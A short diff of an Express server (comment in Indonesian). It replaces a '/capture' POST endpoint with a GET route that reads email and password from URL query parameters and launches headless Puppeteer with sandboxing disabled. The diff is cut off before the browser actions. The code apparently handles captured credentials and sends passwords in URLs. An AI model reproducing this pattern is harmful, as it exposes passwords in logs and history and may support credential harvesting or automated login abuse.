@@ -8,12 +8,9 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
 
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
-});
+app.get('/', async (req, res) => {
+    const { email, password } = req.query; // Mengambil data dari parameter URL
 
-app.post('/capture', async (req, res) => {
-    const { email, password } = req.body;
     try {
         const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] });
         const page = await browser.newPage();
